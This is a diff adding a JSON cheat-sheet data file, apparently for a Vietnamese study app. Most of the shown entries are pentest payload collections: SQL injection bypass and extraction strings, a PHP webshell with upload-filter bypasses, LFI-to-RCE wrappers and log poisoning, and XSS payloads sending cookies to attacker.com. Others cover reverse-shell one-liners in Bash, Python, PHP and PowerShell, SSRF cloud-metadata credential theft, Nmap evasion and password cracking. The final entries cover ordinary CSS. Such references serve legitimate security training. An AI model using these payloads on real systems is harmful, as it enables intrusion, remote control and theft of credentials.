@@ -1,0 +1,1948 @@
+{
+  "version": 4,
+  "generatedAt": "2026-09-27T07:47:38.614Z",
+  "categories": [
+    {
+      "id": "pentest",
+      "name": "Pentest & Web Security",
+      "desc": "Tổng hợp payloads khai thác Web, công cụ Nmap, Fuzzing, Reverse Shell, Privilege Escalation"
+    },
+    {
+      "id": "wazuh",
+      "name": "Wazuh SIEM & SOC",
+      "desc": "Kiến trúc Wazuh Manager, Daemons, Sysmon Event IDs, Rules, Decoders, REST API và Troubleshooting"
+    },
+    {
+      "id": "linux-system",
+      "name": "Linux System & Web Server",
+      "desc": "Quản trị hệ thống Linux, systemctl, tường lửa iptables, tcpdump, curl, network và Nginx"
+    },
+    {
+      "id": "linux-file",
+      "name": "Linux File & Log Operations",
+      "desc": "Phân quyền chmod/chown, phân tích log realtime tail/grep, JSON logs và Archives"
+    },
+    {
+      "id": "html",
+      "name": "HTML Architecture & Tags",
+      "desc": "Cấu trúc DOM HTML5, thẻ văn bản, danh sách, containers và thuộc tính attributes"
+    },
+    {
+      "id": "css",
+      "name": "CSS Selectors & Layout",
+      "desc": "Bộ chọn CSS, Box Model, Margin, Padding, Định vị Position và Độ ưu tiên Specificity"
+    }
+  ],
+  "entries": [
+    {
+      "id": "cs-sqli-auth-bypass",
+      "type": "command",
+      "title": "SQL Injection: Authentication Bypass Payloads",
+      "categoryId": "pentest",
+      "language": "SQL",
+      "content": "Payloads vô hiệu hóa logic xác thực mật khẩu trên các form đăng nhập ghép chuỗi SQL động.",
+      "code": "' OR 1=1--\n' OR '1'='1\nadmin' --\nadmin' #\nadmin'/*\n' or 1=1#\n' or 1=1/*\n\") or \"1\"=\"1\"--\n') or ('1'='1--\nadmin' or '1'='1'--",
+      "notes": "Khai thác truy vấn: SELECT * FROM users WHERE username = '$user' AND password = '$pass'. Ký tự -- và # dùng để comment toàn bộ điều kiện password phía sau.",
+      "tags": [
+        "sqli",
+        "auth-bypass",
+        "payloads",
+        "web-pentest"
+      ],
+      "pinned": true,
+      "isKnowledge": false
+    },
+    {
+      "id": "cs-sqli-union-attack",
+      "type": "command",
+      "title": "SQL Injection: UNION SELECT Data Extraction & Fingerprinting",
+      "categoryId": "pentest",
+      "language": "SQL",
+      "content": "Khai thác truy vấn UNION để dò số lượng cột, xác định kiểu dữ liệu hiển thị và trích xuất bảng dữ liệu.",
+      "code": "-- 1. Dò số lượng cột (Column Count)\n' ORDER BY 1--\n' ORDER BY 2--\n' ORDER BY 3-- (tang dan den khi bi loi)\n\n-- 2. Xac dinh vi tri cot nhan chuoi (String Projection)\n' UNION SELECT 'a', NULL, NULL--\n' UNION SELECT NULL, 'a', NULL--\n\n-- 3. Trich xuat thong tin phien ban CSDL\n' UNION SELECT @@version, NULL-- (MySQL / MSSQL)\n' UNION SELECT version(), NULL-- (PostgreSQL)\n' UNION SELECT banner, NULL FROM v$version-- (Oracle)\n\n-- 4. Trich xuat Schema, Tables va Columns (MySQL / PostgreSQL)\n' UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=database()--\n' UNION SELECT username, password FROM users--",
+      "notes": "Điều kiện: Số lượng cột và kiểu dữ liệu trong truy vấn UNION phải tương thích với câu lệnh SQL gốc.",
+      "tags": [
+        "sqli",
+        "union-select",
+        "data-extraction",
+        "payloads"
+      ],
+      "pinned": true,
+      "isKnowledge": false
+    },
+    {
+      "id": "cs-sqli-blind-error",
+      "type": "command",
+      "title": "SQL Injection: Blind & Error-Based Payloads (Time & Error)",
+      "categoryId": "pentest",
+      "language": "SQL",
+      "content": "Khai thác khi ứng dụng không in kết quả SQL ra màn hình: Sử dụng điều kiện thời gian trễ (Time-based) hoặc kích hoạt lỗi (Error-based).",
+      "code": "-- Time-Based Blind (Do tre thoi gian)\n' OR IF(1=1, SLEEP(5), 0)-- (MySQL)\n'; IF (1=1) WAITFOR DELAY '0:0:5'-- (MSSQL)\n' || pg_sleep(5)-- (PostgreSQL)\n' AND 1234=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- (Oracle)\n\n-- Error-Based Injection (Trich xuat qua thong bao loi)\n' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)-- (MySQL)\n' AND extractvalue(1, concat(0x7e, (SELECT user()), 0x7e))-- (MySQL ExtractValue)\n' AND updatexml(1, concat(0x7e, (SELECT user()), 0x7e), 1)-- (MySQL UpdateXML)\n' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- (PostgreSQL Cast Error)",
+      "notes": "Time-based kiểm tra phản hồi HTTP response time. Error-based ép CSDL ném ra chuỗi kết quả qua thông báo lỗi cú pháp.",
+      "tags": [
+        "sqli",
+        "blind-sqli",
+        "error-based",
+        "time-based"
+      ],
+      "pinned": false,
+      "isKnowledge": false
+    },
+    {
+      "id": "cs-sqli-waf-bypass",
+      "type": "command",
+      "title": "SQL Injection: WAF & Filter Bypass Techniques",
+      "categoryId": "pentest",
+      "language": "SQL",
+      "content": "Các kỹ thuật vượt qua bộ lọc ký tự hoặc Web Application Firewall khi bị chặn khoảng trắng, dấu nháy hoặc từ khóa.",
+      "code": "-- 1. Bypass khoang trang bang comment\n'/**/UNION/**/SELECT/**/NULL,username,password/**/FROM/**/users--\n'%09UNION%09SELECT%09NULL-- (Tab)\n'%0aUNION%0aSELECT%0aNULL-- (Newline)\n\n-- 2. Bypass bo loc tu khoa viet hoa/thuong hoac lap lai (Case & Nested)\nuNiOn sElEcT\nuniunionon seleselectct\n\n-- 3. Su dung ma hoa Hex hoac Char thay cho dau nhay\nSELECT * FROM users WHERE username = 0x61646d696e (admin)\nSELECT * FROM users WHERE username = CHAR(97,100,109,105,110)\n\n-- 4. Inline comments tren MySQL\n/*!50000SELECT*/ * /*!50000FROM*/ users",
+      "notes": "Khai thác sự không nhất quán giữa cơ chế phân tích cú pháp của WAF và parser thực tế của CSDL mục tiêu.",
+      "tags": [
+        "sqli",
+        "waf-bypass",
+        "filter-evasion"
+      ],
+      "pinned": false,
+      "isKnowledge": false
+    },
+    {
+      "id": "cs-upload-filter-bypass",
+      "type": "command",
+      "title": "File Upload: Multi-Layer Filter Bypass Payloads",
+      "categoryId": "pentest",
+      "language": "HTTP / PHP",
+      "content": "Tổng hợp các kỹ thuật bypass bộ lọc tải file: Content-Type MIME, Alternative Extensions, Double Extension, Null Byte và Magic Bytes.",
+      "code": "<!-- 1. Content-Type Header Spoofing (Doi thanh MIME anh) -->\nContent-Type: image/jpeg\nContent-Type: image/png\nContent-Type: image/gif\n\n<!-- 2. Blacklist Extension Bypass (Duoi file thay the) -->\nPHP:  shell.phtml, shell.php5, shell.php7, shell.phps, shell.phar, shell.inc\nASP:  shell.cer, shell.asa, shell.cdx, shell.aspx\nJSP:  shell.jspx, shell.jsw, shell.jsf\n\n<!-- 3. Case Sensitivity & Dac tinh he dieu hanh -->\nshell.pHp, shell.PHP, shell.php. (Windows bo cham cuoi), shell.php::$DATA\n\n<!-- 4. Double Extensions & Null Byte Injection -->\nshell.php.jpg, shell.php.png, shell.png.php\nshell.php%00.jpg, shell.php\\x00.jpg (PHP < 5.3.4)\n\n<!-- 5. Magic Bytes Spoofing (Header file gia) -->\nGIF89a;\n<?php system($_GET['cmd']); ?>",
+      "notes": "Sử dụng Burp Suite Repeater để chỉnh sửa phần Content-Type và filename trong phần multipart/form-data trước khi gửi lên server.",
+      "tags": [
+        "file-upload",
+        "bypass",
+        "webshell",
+        "rce"
+      ],
+      "pinned": true,
+      "isKnowledge": false
+    },
+    {
+      "id": "cs-upload-config-override",
+      "type": "command",
+      "title": "File Upload: Configuration Overwrite (.htaccess & .user.ini)",
+      "categoryId": "pentest",
+      "language": "Apache / PHP",
+      "content": "Ghi đè cấu hình web server Apache hoặc PHP-FPM để ép server thực thi file ảnh dưới dạng mã PHP.",
+      "code": "<!-- 1. File .htaccess ghi de cau hinh Apache -->\nAddType application/x-httpd-php .jpg\nSetHandler application/x-httpd-php\n\n<!-- Hoac dung php_value: -->\nphp_value auto_append_file shell.jpg\n\n<!-- 2. File .user.ini tren PHP-FPM / Nginx -->\nauto_prepend_file = shell.jpg",
+      "notes": "Bước 1: Tải lên file `.htaccess` hoặc `.user.ini`. Bước 2: Tải lên file `shell.jpg` chứa mã PHP. Bước 3: Truy cập vào thư mục upload để kích hoạt mã.",
+      "tags": [
+        "file-upload",
+        "htaccess",
+        "user-ini",
+        "rce"
+      ],
+      "pinned": false,
+      "isKnowledge": false
+    },
+    {
+      "id": "cs-lfi-traversal",
+      "type": "command",
+      "title": "Path Traversal & LFI: Payloads & Filter Bypass",
+      "categoryId": "pentest",
+      "language": "Linux / Web",
+      "content": "Khai thác lỗ hổng Directory Traversal / Local File Inclusion để đọc file cấu hình và file hệ thống nhạy cảm.",
+      "code": "<!-- 1. Co ban (Linux & Windows) -->\n../../../../etc/passwd\n../../../../etc/shadow\n..\\..\\..\\..\\windows\\win.ini\n..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts\n\n<!-- 2. Non-recursive Stripping Bypass (Bo loc replace ../ dung 1 lan) -->\n....//....//....//etc/passwd\n....\\/....\\/....\\/etc/passwd\n\n<!-- 3. URL Encoding & Double URL Encoding -->\n%2e%2e%2f%2e%2e%2fetc%2fpasswd\n%252e%252e%252f%252e%252e%252fetc%252fpasswd\n%c0%ae%c0%ae%c0%af (Overlong UTF-8 Unicode)\n\n<!-- 4. Bat buoc duong dan co dinh (Path Traversal with Prefix) -->\n/var/www/images/../../../../etc/passwd\n\n<!-- 5. Null Byte Injection (PHP < 5.3.4) -->\n../../../../etc/passwd%00.png",
+      "notes": "File quan trọng cần đọc: /etc/passwd, /etc/hosts, /proc/self/environ, /var/log/apache2/access.log, C:\\Windows\\win.ini.",
+      "tags": [
+        "path-traversal",
+        "lfi",
+        "payloads",
+        "bypass"
+      ],
+      "pinned": true,
+      "isKnowledge": false
+    },
+    {
+      "id": "cs-php-wrappers",
+      "type": "command",
+      "title": "LFI to RCE: PHP Wrappers & Log Poisoning",
+      "categoryId": "pentest",
+      "language": "PHP",
+      "content": "Nâng cấp từ đọc file (LFI) lên thực thi mã từ xa (RCE) qua các luồng stream PHP Wrapper hoặc Log Poisoning.",
+      "code": "<!-- 1. Doc ma nguon PHP bang Base64 Filter -->\nphp://filter/convert.base64-encode/resource=index.php\nphp://filter/read=convert.base64-encode/resource=config.php\n\n<!-- 2. Thuc thi ma truc tiep qua data wrapper -->\ndata://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id\n\n<!-- 3. Thuc thi qua php://input (POST body chua code PHP) -->\nPOST /index.php?file=php://input HTTP/1.1\n<?php system('id'); ?>\n\n<!-- 4. Log Poisoning qua SSH / Apache -->\nssh '<?php system($_GET[\"cmd\"]); ?>'@10.10.10.11\ncurl -A \"<?php system($_GET['cmd']); ?>\" http://10.10.10.11/\n// Sau do LFI vao: /var/log/auth.log hoac /var/log/apache2/access.log",
+      "notes": "Wrapper php://filter yêu cầu allow_url_include=Off vẫn dùng được. data:// và php://input yêu cầu allow_url_include=On.",
+      "tags": [
+        "lfi",
+        "php-wrappers",
+        "log-poisoning",
+        "rce"
+      ],
+      "pinned": false,
+      "isKnowledge": false
+    },
+    {
+      "id": "cs-xss-payloads",
+      "type": "command",
+      "title": "Cross-Site Scripting (XSS): Payloads & Filter Bypass",
+      "categoryId": "pentest",
+      "language": "JavaScript",
+      "content": "Tổng hợp payloads khai thác XSS (Reflected, Stored, DOM) và kỹ thuật vượt qua bộ lọc WAF chặn thẻ script hoặc dấu nháy.",
+      "code": "<!-- 1. Basic Proof of Concept (PoC) -->\n<script>alert(1)</script>\n<script>prompt(document.domain)</script>\n\n<!-- 2. Event Handlers khong can the <script> -->\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n<body onload=alert(1)>\n<iframe src=\"javascript:alert(1)\"></iframe>\n<input autofocus onfocus=alert(1)>\n\n<!-- 3. Bypass bo loc khong dung khoang trang / dau ngoac -->\n<svg/onload=alert(1)>\n<img/src=x/onerror=alert(1)>\n<script>alert`1`</script>\n\n<!-- 4. Payload danh cap Cookie va Session Token -->\n<script>\nfetch('http://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));\n</script>\n<img src=x onerror=\"this.src='http://attacker.com/?c='+document.cookie\">",
+      "notes": "Khai thác xảy ra khi ứng dụng phản hồi input của người dùng vào trang HTML mà không qua hàm mã hóa HTML entities.",
+      "tags": [
+        "xss",
+        "javascript",
+        "cookie-theft",
+        "payloads"
+      ],
+      "pinned": false,
+      "isKnowledge": false
+    },
+    {
+      "id": "cs-command-injection",
+      "type": "command",
+      "title": "Command Injection: Separators & Space Bypass",
+      "categoryId": "pentest",
+      "language": "Bash / Linux",
+      "content": "Khai thác khi ứng dụng truyền tham số người dùng vào hàm thực thi shell hệ thống (system, exec, passthru).",
+      "code": "# 1. Cac ky tu ngat lenh (Command Separators)\n; id\n| id\n|| id\n& id\n&& id\n%0a id (Newline)\n`id`\n$(id)\n\n# 2. Bypass bo loc chan khoang trang (No Space Bypass)\ncat$IFS/etc/passwd\ncat${IFS}/etc/passwd\n{cat,/etc/passwd}\ncat</etc/passwd\n\n# 3. Bypass bo loc chan ten lenh\nc'a't /etc/passwd\nc\"a\"t /etc/passwd\n/bin/c?t /etc/passwd\nexport a=c; export b=at; $a$b /etc/passwd\n\n# 4. Thuc thi payload ma hoa Base64\necho \"Y2F0IC9ldGMvcGFzc3dk\" | base64 -d | sh",
+      "notes": "Lệnh thực thi với quyền của tiến trình web server (www-data, apache, iis_iusrs).",
+      "tags": [
+        "command-injection",
+        "rce",
+        "bypass",
+        "linux"
+      ],
+      "pinned": true,
+      "isKnowledge": false
+    },
+    {
+      "id": "cs-reverse-shells",
+      "type": "command",
+      "title": "Reverse Shell: One-Liners (Bash, Netcat, Python, PHP, PowerShell)",
+      "categoryId": "pentest",
+      "language": "Linux / Windows",
+      "content": "Tổng hợp các câu lệnh Reverse Shell một dòng đáng tin cậy nhất để gọi kết nối về máy tấn công.",
+      "code": "# Machine Listener (Chay tren may Kali cua ban truoc):\nnc -lvnp 4444\n\n# 1. Bash Reverse Shell\nbash -i >& /dev/tcp/10.10.10.10/4444 0>&1\n/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'\n\n# 2. Netcat Reverse Shell\nnc -e /bin/bash 10.10.10.10 4444\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4444 >/tmp/f\n\n# 3. Python 3 Reverse Shell\npython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.10.10\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'\n\n# 4. PHP Reverse Shell\nphp -r '$sock=fsockopen(\"10.10.10.10\",4444);exec(\"/bin/bash -i <&3 >&3 2>&3\");'\n\n# 5. PowerShell Reverse Shell (Windows)\npowershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
+      "notes": "Sau khi có shell, nâng cấp TTY hoàn chỉnh: python3 -c \"import pty; pty.spawn('/bin/bash')\", Ctrl+Z, stty raw -echo; fg, export TERM=xterm.",
+      "tags": [
+        "reverse-shell",
+        "netcat",
+        "bash",
+        "python",
+        "powershell"
+      ],
+      "pinned": true,
+      "isKnowledge": false
+    },
+    {
+      "id": "cs-ssrf-payloads",
+      "type": "command",
+      "title": "Server-Side Request Forgery (SSRF): Localhost & Cloud Metadata",
+      "categoryId": "pentest",
+      "language": "HTTP / Network",
+      "content": "Payloads khai thác khi web server gửi HTTP request đến URL do người dùng chỉ định.",
+      "code": "<!-- 1. Localhost Bypasses (Truy cap dich vu noi bo) -->\nhttp://127.0.0.1:8080/admin\nhttp://localhost:8080/\nhttp://0.0.0.0/\nhttp://127.1/\nhttp://[::1]/\nhttp://2130706433/ (Decimal IP)\nhttp://0x7f000001/ (Hex IP)\nhttp://127.0.0.1.nip.io/ (DNS Rebinding)\n\n<!-- 2. Cloud Metadata Extraction (Lay IAM credentials & tokens) -->\nAWS:    http://169.254.169.254/latest/meta-data/iam/security-credentials/\nAWSv2:  TOKEN=$(curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\")\nGCP:    http://metadata.google.internal/computeMetadata/v1/ -H \"Metadata-Flavor: Google\"\nAzure:  http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H \"Metadata: true\"\n\n<!-- 3. Protocol Smuggling -->\nfile:///etc/passwd\ndict://127.0.0.1:6379/INFO (Redis)\ngopher://127.0.0.1:6379/_flushall",
+      "notes": "Khai thác SSRF có thể dẫn đến đánh cắp AWS Access Keys, đọc file hệ thống hoặc tương tác với cơ sở dữ liệu nội bộ không đặt password.",
+      "tags": [
+        "ssrf",
+        "cloud-metadata",
+        "aws",
+        "localhost"
+      ],
+      "pinned": false,
+      "isKnowledge": false
+    },
+    {
+      "id": "cs-nmap-master",
+      "type": "command",
+      "title": "Nmap: Network Scanning & Evasion Master Guide",
+      "categoryId": "pentest",
+      "language": "Linux / Network",
+      "content": "Tổng hợp đầy đủ các kỹ thuật quét mạng, quét cổng ngầm, nhận diện dịch vụ và vượt tường lửa.",
+      "code": "# 1. Quet cong ngam SYN Stealth Scan (Toan dai 65535 cong)\nsudo nmap -sS -p- -T4 --min-rate 1000 10.10.10.11\n\n# 2. Quet phien ban dich vu va script mac dinh (Nhanh & hieu qua)\nsudo nmap -sV -sC -p 21,22,80,139,445,3306 10.10.10.11 -oA nmap_scan\n\n# 3. Quet he dieu hanh va Traceroute\nsudo nmap -O --osscan-guess 10.10.10.12\n\n# 4. Quet cong UDP pho bien\nsudo nmap -sU --top-ports 50 10.10.10.11\n\n# 5. Quet lo hong tu dong bang Nmap Scripting Engine (NSE)\nsudo nmap --script vuln 10.10.10.11\nsudo nmap --script smb-vuln* -p 445 10.10.10.12\n\n# 6. Evasion (Vuot qua Firewall / IDS)\nsudo nmap -sS -f 10.10.10.11 (Packet fragmentation)\nsudo nmap -sS -D RND:10 10.10.10.11 (Gia mao 10 IP mo)\nsudo nmap -sS -g 53 10.10.10.11 (Source port DNS 53)",
+      "notes": "Flags quan trọng: -sS (SYN), -sV (Version), -sC (Default Scripts), -O (OS), -p- (All ports), -T4 (Aggressive Timing), -oN (Normal output).",
+      "tags": [
+        "nmap",
+        "recon",
+        "portscan",
+        "network",
+        "evasion"
+      ],
+      "pinned": true,
+      "isKnowledge": false
+    },
+    {
+      "id": "cs-web-fuzzing",
+      "type": "command",
+      "title": "Web Fuzzing & Directory Discovery: Ffuf & Gobuster",
+      "categoryId": "pentest",
+      "language": "Linux / Tool",
+      "content": "Dò quét tìm kiếm file ẩn, thư mục quản trị, virtual hosts và fuzzing tham số API.",
+      "code": "# 1. Gobuster do thu muc & file\ngobuster dir -u http://10.10.10.31 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak -t 40\n\n# 2. Ffuf do thu muc nhanh\nffuf -u http://10.10.10.31/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,302,403\n\n# 3. Ffuf do Virtual Hosts / Subdomains (Kem loc kich thuoc response)\nffuf -u http://10.10.10.31 -H \"Host: FUZZ.target.local\" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 1420\n\n# 4. Ffuf Fuzzing tham so GET parameter\nffuf -u \"http://10.10.10.31/page.php?FUZZ=test\" -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 850",
+      "notes": "Cờ -fs (Filter Size) hoặc -fc (Filter Code) trong ffuf rất quan trọng để loại bỏ các phản hồi rác mặc định.",
+      "tags": [
+        "ffuf",
+        "gobuster",
+        "fuzzing",
+        "directory-bruteforce"
+      ],
+      "pinned": false,
+      "isKnowledge": false
+    },
+    {
+      "id": "cs-password-cracking",
+      "type": "command",
+      "title": "Brute Force & Hash Cracking: Hydra & Hashcat",
+      "categoryId": "pentest",
+      "language": "Linux / Tool",
+      "content": "Tấn công dò mật khẩu dịch vụ mạng (SSH, FTP, Web) và bẻ khóa các loại hash mật khẩu.",
+      "code": "# 1. Hydra do mat khau SSH\nhydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.11 -t 4\n\n# 2. Hydra do mat khau form dang nhap Web POST (DVWA)\nhydra -l admin -P rockyou.txt 10.10.10.31 http-post-form \"/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed\"\n\n# 3. Nhan dien loai Hash bang hashid\nhashid -m \"5f4dcc3b5aa765d61d8327deb882cf99\"\n\n# 4. Hashcat be khoa Hash\nhashcat -m 0 hash.txt rockyou.txt (Mode 0: MD5)\nhashcat -m 1000 hash.txt rockyou.txt (Mode 1000: NTLM Windows)\nhashcat -m 1400 hash.txt rockyou.txt (Mode 1400: SHA256)\nhashcat -m 3200 hash.txt rockyou.txt (Mode 3200: bcrypt / Linux shadow)\n\n# 5. John the Ripper\njohn --wordlist=rockyou.txt hashes.txt",
+      "notes": "Lưu ý kiểm tra cơ chế lockout (khóa tài khoản) của mục tiêu trước khi chạy Hydra brute-force.",
+      "tags": [
+        "hydra",
+        "hashcat",
+        "password-cracking",
+        "brute-force"
+      ],
+      "pinned": false,
+      "isKnowledge": false
+    },
+    {
+      "id": "cs-privilege-escalation",
+      "type": "command",
+      "title": "Linux & Windows Privilege Escalation: Quick Enumeration",
+      "categoryId": "pentest",
+      "language": "Linux / Windows",
+      "content": "Các lệnh dò tìm đường leo thang đặc quyền lên Root (Linux) hoặc SYSTEM / Administrator (Windows).",
+      "code": "# === LINUX PRIVILEGE ESCALATION ===\n# 1. Kiem tra quyen sudo khong can password\nsudo -l\n\n# 2. Tim kiem file SUID bat thuong\nfind / -perm -u=s -type f 2>/dev/null\n\n# 3. Kiem tra Linux Capabilities\ngetcap -r / 2>/dev/null\n\n# 4. Kiem tra file cron jobs tu dong\ncat /etc/crontab; ls -la /etc/cron.*\n\n# 5. Kiem tra file /etc/passwd co quyen write khong\nls -l /etc/passwd\n\n# === WINDOWS PRIVILEGE ESCALATION ===\n# 1. Kiem tra dac quyen token\nwhoami /priv (Chu y: SeImpersonatePrivilege -> PrintSpoofer/JuicyPotato)\n\n# 2. Kiem tra mat khau luu trong Credential Manager\ncmdkey /list\n\n# 3. Kiem tra dich vu Unquoted Service Paths\nwmic service get name,displayname,pathname,startmode |findstr /i \"Auto\" |findstr /i /v \"C:\\Windows\\\\\" |findstr /i /v \"\"\"",
+      "notes": "Nếu có SeImpersonatePrivilege: Sử dụng PrintSpoofer.exe -i -c cmd để leo thẳng lên NT AUTHORITY\\SYSTEM.",
+      "tags": [
+        "privilege-escalation",
+        "suid",
+        "sudo",
+        "windows-privesc"
+      ],
+      "pinned": true,
+      "isKnowledge": false
+    },
+    {
+      "id": "47960dce-d738-45ff-8683-b608b3289639",
+      "type": "command",
+      "title": "Pseudo-classes & Pseudo-elements",
+      "categoryId": "css",
+      "language": "CSS",
+      "content": "Pseudo-classes (Lớp giả) can thiệp khi người dùng tương tác: ':hover' (chuột lướt qua), ':focus' (khi input được trỏ nháy phím), ':first-child' (phần tử con đầu tiên). Pseudo-elements (Phần tử giả) băm nhỏ phần tử hoặc nhúng HTML ảo: '::before', '::after' chèn một DOM ảo vào trước/sau nội dung.",
+      "code": "button:hover { background: red; }\ninput:focus { border-color: blue; }\n\n.text-box::before {\n  content: \"★\"; /* Bắt buộc phải có thuộc tính content */\n  color: yellow;\n  display: inline-block;\n}",
+      "notes": "DOM ảo tạo bởi ::before và ::after không tồn tại trong source HTML nguyên thủy, rất hữu dụng để làm icon, overlay che phủ mà không làm bẩn mã HTML.",
+      "tags": [
+        "css",
+        "pseudo-classes",
+        "pseudo-elements",
+        "hover"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1784279276085,
+      "updatedAt": 1784281945739
+    },
+    {
+      "id": "6bf83811-caf0-4599-90a5-eaa25138ae12",
+      "type": "command",
+      "title": "Hàm CSS và Đơn vị (Functions & Units)",
+      "categoryId": "css",
+      "language": "CSS",
+      "content": "Hàm var() dùng để lấy giá trị từ biến CSS (--tên-biến). Hàm rgba() định nghĩa màu kèm kênh Alpha (độ trong suốt từ 0-1). Các đơn vị chính: px (pixel vật lý), % (tỷ lệ theo phần tử cha), rem (tỷ lệ theo font-size của thẻ <html>).",
+      "code": ":root { --main-bg: rgba(0, 0, 0, 0.5); }\n.box {\n  width: 50%; /* Bằng nửa thẻ cha */\n  font-size: 2rem; /* Bằng 2 lần kích thước font gốc */\n  background-color: var(--main-bg);\n}",
+      "notes": "Sử dụng 'rem' cho font-size, margin, padding giúp toàn bộ trang web có thể tự động scale đồng bộ khi người dùng thay đổi font size trên trình duyệt.",
+      "tags": [
+        "css",
+        "variables",
+        "units",
+        "rgba",
+        "rem"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1784279276085,
+      "updatedAt": 1784281924389
+    },
+    {
+      "id": "1c4ea580-e9e9-48c6-ae08-9e84d0060340",
+      "type": "command",
+      "title": "CSS Position (Định vị luồng hiển thị)",
+      "categoryId": "css",
+      "language": "CSS",
+      "content": "Ghi đè luồng render mặc định của trình duyệt (Normal flow). \n- relative: Tạo không gian tọa độ cục bộ, dịch chuyển bằng top/left nhưng vẫn giữ nguyên khoảng không cũ.\n- absolute: Nhấc bổng phần tử khỏi DOM, neo tọa độ theo thẻ cha gần nhất có position (khác static).\n- fixed: Neo vĩnh viễn theo Viewport (màn hình trình duyệt), không bị trôi khi cuộn.\n- sticky: Cư xử như relative cho đến khi cuộn tới một ngưỡng (vd top: 0), nó sẽ biến thành fixed.",
+      "code": ".parent { position: relative; }\n.child {\n  position: absolute;\n  top: 0;\n  right: 0;\n  z-index: 10; /* Lớp ưu tiên trục Z, số to nổi lên trên */\n}\n.header { position: sticky; top: 0; }",
+      "notes": "Các thuộc tính dịch chuyển (top, right, bottom, left) và z-index chỉ hoạt động khi phần tử được set position khác static.",
+      "tags": [
+        "css",
+        "position",
+        "z-index"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1784279276085,
+      "updatedAt": 1784281903679
+    },
+    {
+      "id": "8681a93f-5d98-4dd9-8389-9c300fbbae1a",
+      "type": "command",
+      "title": "Thuộc tính Background (Nền)",
+      "categoryId": "css",
+      "language": "CSS",
+      "content": "Tập hợp các lệnh xử lý lớp nền. 'background-image' gọi hàm url() để tải ảnh. 'background-size' (cover: phóng to phủ kín, contain: giữ tỷ lệ nằm trọn trong box). 'background-position' xác định trục x, y để căn chỉnh ảnh. 'background-origin' xác định điểm bắt đầu render ảnh (từ viền, từ padding hay từ nội dung).",
+      "code": ".hero {\n  background-image: url('./bg.png');\n  background-size: cover;\n  background-position: center bottom;\n  background-repeat: no-repeat;\n  /* Shorthand gộp */\n  background: #333 url('./bg.png') no-repeat center/cover;\n}",
+      "notes": "Khi dùng background-image, luôn nên phòng hờ một màu background-color phòng trường hợp ảnh bị lỗi hoặc đang load.",
+      "tags": [
+        "css",
+        "background",
+        "image"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1784279276085,
+      "updatedAt": 1784281940479
+    },
+    {
+      "id": "50c8ae07-fc1c-4755-bcb9-63134234f017",
+      "type": "command",
+      "title": "Border (Đường viền) & Box-sizing",
+      "categoryId": "css",
+      "language": "CSS",
+      "content": "Border vẽ đường viền bao quanh phần tử. Cần 3 tham số cơ bản: độ dày (width), kiểu nét (style - solid, dashed, dotted), và màu (color). Thuộc tính 'box-sizing: border-box' ép trình duyệt gom chung content, padding và border vào kích thước set ban đầu (width/height).",
+      "code": ".box {\n  border: 1px solid red;\n  border-bottom: 2px dashed #000;\n  border-radius: 5px; /* Bo góc */\n  box-sizing: border-box; \n}",
+      "notes": "Luôn luôn set `box-sizing: border-box` ở đầu file CSS cho thẻ `*` để dễ dàng kiểm soát layout, tránh việc tính toán toán học phức tạp khi thêm padding.",
+      "tags": [
+        "css",
+        "box-model",
+        "border",
+        "box-sizing"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1784279276085,
+      "updatedAt": 1784281935443
+    },
+    {
+      "id": "c710b57f-6a70-47bb-8d1b-eac1b254185d",
+      "type": "command",
+      "title": "Margin (Lề ngoài)",
+      "categoryId": "css",
+      "language": "CSS",
+      "content": "Không gian nằm ngoài Border, dùng để đẩy các phần tử ra xa nhau. Cú pháp shorthand giống hệt padding. Có thể nhận giá trị âm để kéo các phần tử đè lên nhau.",
+      "code": ".box {\n  margin-bottom: 20px;\n  /* Căn giữa phần tử block theo chiều ngang */\n  margin: 0 auto;\n}",
+      "notes": "Xảy ra hiện tượng 'Margin Collapse' (sập lề): Khi 2 block elements nằm cạnh nhau theo chiều dọc, margin giữa chúng không cộng dồn mà sẽ lấy giá trị lớn hơn.",
+      "tags": [
+        "css",
+        "box-model",
+        "margin"
+      ],
+      "pinned": false,
+      "isKnowledge": false,
+      "createdAt": 1784279276085,
+      "updatedAt": 1784281935443
+    },
+    {
